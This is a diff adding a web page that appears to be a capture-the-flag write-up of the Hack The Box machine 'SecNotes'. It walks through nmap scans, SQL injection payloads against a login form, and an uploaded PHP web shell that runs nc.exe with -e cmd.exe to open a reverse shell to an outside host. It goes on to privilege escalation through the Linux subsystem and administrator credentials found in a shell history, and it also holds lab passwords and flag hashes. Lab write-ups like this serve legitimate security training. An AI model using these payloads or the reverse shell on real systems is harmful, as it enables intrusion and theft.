@@ -1,0 +1,297 @@
+---
+layout: default
+title: SecNotes
+---
+
+<div class="pretty-font">
+<h1>SecNotes</h1>
+
+<img class="img-fluid" src="/static/img/htb/secnotes/secnotes.png">
+
+<p>This box is almost all about enumerating. To obtain a shell it's necessary to exploit a SQLi vulnerability and, once in, to elevate privileges we will need to play with a new function of Windows, Linux subsystems.</p> 
+
+<h2>Enumeration</h2>
+
+<p>First run an nmap listing versions and executing default scripts.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/secnotes# nmap -sC -sV 10.10.10.97
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-17 11:46 UTC
+Nmap scan report for 10.10.10.97
+Host is up (0.12s latency).
+Not shown: 998 filtered ports
+PORT    STATE SERVICE      VERSION
+80/tcp  open  http         Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+| http-title: Secure Notes - Login
+|_Requested resource was login.php
+445/tcp open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
+Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 2h40m01s, deviation: 4h37m09s, median: 0s
+| smb-os-discovery: 
+|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
+|   OS CPE: cpe:/o:microsoft:windows_10::-
+|   Computer name: SECNOTES
+|   NetBIOS computer name: SECNOTES\x00
+|   Workgroup: HTB\x00
+|_  System time: 2019-01-17T03:47:13-08:00
+| smb-security-mode: 
+|   account_used:  &lt;blank>
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2019-01-17 11:47:10
+|_  start_date: N/A
+
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 65.32 seconds</pre>
+
+<p>To not miss any port, also run another nmap trying all ports.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/secnotes# nmap -p- -T4 10.10.10.97
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-17 11:49 UTC
+Nmap scan report for 10.10.10.97
+Host is up (0.081s latency).
+Not shown: 65532 filtered ports
+PORT     STATE SERVICE
+80/tcp   open  http
+445/tcp  open  microsoft-ds
+8808/tcp open  ssports-bcast
+
+
+Nmap done: 1 IP address (1 host up) scanned in 214.41 seconds</pre>
+
+<p>As shown above, there's something in the port 8808, run another nmap to check what's exactly in there.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/secnotes# nmap -sC -sV -p8808 10.10.10.97
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-17 12:03 UTC
+Nmap scan report for 10.10.10.97
+Host is up (0.058s latency).
+
+PORT     STATE SERVICE VERSION
+8808/tcp open  http    Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.66 seconds</pre>
+
+<p>It looks like there's only a default instalation of an IIS, which we will later use.</p>
+
+<img class="img-fluid" src="/static/img/htb/secnotes/1.png">
+
+<p>On the other hand, when accessing to port 80 you get redirected to a custom login page.</p>
+
+<img class="img-fluid" src="/static/img/htb/secnotes/2.png">
+
+<p>The option to create a new account is available using the Sign up link.</p>
+
+<img class="img-fluid" src="/static/img/htb/secnotes/3.png">
+
+<p>After some investigation, we can deduce that there's a SQLi flaw on the login form.</p>
+
+<p>When specifying the following code as the username.</p>
+
+<pre class="prettyprint">' union select 1,2,3,4-- -</pre>
+
+<img class="img-fluid" src="/static/img/htb/secnotes/4.png">
+
+<p>We can see that <code>2</code> and <code>4</code> are printed on the page, which means that there's an union based attack we can use to extract information from the database.</p>
+
+<img class="img-fluid" src="/static/img/htb/secnotes/5.png">
+
+<p>But if trying to use the following code to extract users and passwords, an error message pops up because there's a restriction on the length of the username.</p>
+
+<pre class="prettyprint">' union select 1,username,3,password from users-- -</pre>
+
+<p>Instead use the following payloads to retrieve the information.</p>
+
+<pre class="prettyprint">' union select 1,id,3,username from users-- -</pre>
+
+<img class="img-fluid" src="/static/img/htb/secnotes/6.png">
+
+<pre class="prettyprint">' union select 1,id,3,password from users-- -</pre>
+
+<img class="img-fluid" src="/static/img/htb/secnotes/7.png">
+
+<p>Being able to obtain the hashed passwords of every user using the application.</p>
+
+<pre class="prettyprint">eks:$2y$10$dv3rCvSFRMYtcdgNWhF44u3amnovAuffb0R0yVtu5Dk8qc41Rbpmm
+tyler:$2y$10$IMZPI.99fAPmsvGi0KWaJ.8pakoHDfobENhzx4Kwbb/7OpvFXaQt.
+</pre>
+
+<p>But instead of using there's credentials, we are going to use something that is also hidden in the database. We can use the following username to see all the notes published of every user.</p>
+
+<pre class="prettyprint">' or '1'='1</pre>
+
+<p>On one of the notes there are the credentials to access, it seems, one of the SMB shares.</p>
+
+<img class="img-fluid" src="/static/img/htb/secnotes/8.png">
+
+<h2>Explotation</h2>
+
+<p>Connect to the specified share and see that we have write permissions in there.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/secnotes# smbclient //10.10.10.97/new-site -U tyler 
+Enter WORKGROUP\tyler's password: 92g!mA8BGjOirkL%OG*&
+Try "help" to get a list of possible commands.
+smb: \> 
+</pre>
+
+<p>It's possible to identify that in this share are stored the files used on the IIS webpage we saw before.</p>
+
+<pre class="prettyprint">
+smb: \> dir
+  .                                   D        0  Thu Jan 17 15:21:35 2019
+  ..                                  D        0  Thu Jan 17 15:21:35 2019
+  iisstart.htm                        A      696  Thu Jun 21 15:26:03 2018
+  iisstart.png                        A    98757  Thu Jun 21 15:26:03 2018
+</pre>
+
+<p>Create a malicious php file to upload.</p>
+
+<pre class="prettyprint">
+&lt;?php echo shell_exec('nc.exe 10.10.16.32 6969 -e cmd.exe'); ?>
+</pre>
+
+<p>Upload the php and the nc binary.</p>
+
+<pre class="prettyprint">
+smb: \> put caca.php 
+putting file caca.php as \caca.php (0.1 kb/s) (average 0.1 kb/s)
+smb: \> put nc.exe 
+putting file nc.exe as \nc.exe (38.8 kb/s) (average 17.7 kb/s)
+</pre>
+
+<p>Access to the php file <code>http://10.10.10.97:8808/caca.php</code> to execute it and listen on the specified port to get a reverse shell.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/secnotes# nc -nlvp 6969
+Ncat: Version 7.70 ( https://nmap.org/ncat )
+Ncat: Listening on :::6969
+Ncat: Listening on 0.0.0.0:6969
+Ncat: Connection from 10.10.10.97.
+Ncat: Connection from 10.10.10.97:51940.
+Microsoft Windows [Version 10.0.17134.228]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\inetpub\new-site>
+</pre>
+
+<p>The flag is on tyler's desktop.</p>
+
+<pre class="prettyprint">
+C:\Users\tyler\Desktop>type user.txt
+type user.txt
+<span flag="6fa7556968052a83183fb8099cb904f3">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+</pre>
+
+<h2>Privilege escalation</h2>
+
+<p>Looking through the machine directories, we can found something under Distros folder, which looks like an Ubuntu subsystem.</p>
+
+<pre class="prettyprint">
+C:\Distros>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 9CDD-BADA
+
+ Directory of C:\Distros
+
+06/21/2018  02:07 PM     &lt;DIR>          .
+06/21/2018  02:07 PM     &lt;DIR>          ..
+06/21/2018  04:59 PM     &lt;DIR>          Ubuntu
+               0 File(s)              0 bytes
+               3 Dir(s)  32,628,154,368 bytes free
+</pre>
+
+<p>Search for the bash binary and run it to enter into the Ubuntu subsystem.</p>
+
+<pre class="prettyprint">
+C:\>dir /s bash.exe
+dir /s bash.exe
+ Volume in drive C has no label.
+ Volume Serial Number is 9CDD-BADA
+
+ Directory of C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5
+
+06/21/2018  02:02 PM           115,712 bash.exe
+               1 File(s)        115,712 bytes
+
+
+     Total Files Listed:
+               1 File(s)        115,712 bytes
+               0 Dir(s)  32,912,412,672 bytes free
+
+C:\>C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
+C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
+mesg: ttyname failed: Inappropriate ioctl for device
+whoami
+root
+</pre>
+
+<p>Upgrade the shell using python.</p>
+
+<pre class="prettyprint">
+python -c 'import pty;pty.spawn("/bin/bash")'
+root@SECNOTES:~#
+</pre>
+
+<p>On the root's history, we can can found how the user tried to connect to the SMB share, leaving the administrator's credentials there.</p>
+
+<pre class="prettyprint">
+root@SECNOTES:~# history
+history
+    1  cd /mnt/c/
+    2  ls
+    3  cd Users/
+    4  cd /
+    5  cd ~
+    6  ls
+    7  pwd
+    8  mkdir filesystem
+    9  mount //127.0.0.1/c$ filesystem/
+   10  sudo apt install cifs-utils
+   11  mount //127.0.0.1/c$ filesystem/
+   12  mount //127.0.0.1/c$ filesystem/ -o user=administrator
+   13  cat /proc/filesystems
+   14  sudo modprobe cifs
+   15  smbclient
+   16  apt install smbclient
+   17  smbclient
+   18  smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
+...
+</pre>
+
+<p>Connect to the SMB share using the obtained credentials.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/secnotes# smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' //10.10.10.97/c$
+Try "help" to get a list of possible commands.
+smb: \> 
+</pre>
+
+<p>The flag can be found and downloaded on the Administrator's Desktop.</p>
+
+<pre class="prettyprint">
+smb: \Users\Administrator\Desktop\> get root.txt
+getting file \Users\Administrator\Desktop\root.txt of size 34 as root.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+smb: \Users\Administrator\Desktop\> exit
+root@kali:~/htb/secnotes# cat root.txt 
+<span flag="7250cde1cab0bbd93fc1edbdc83d447b">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+</pre>
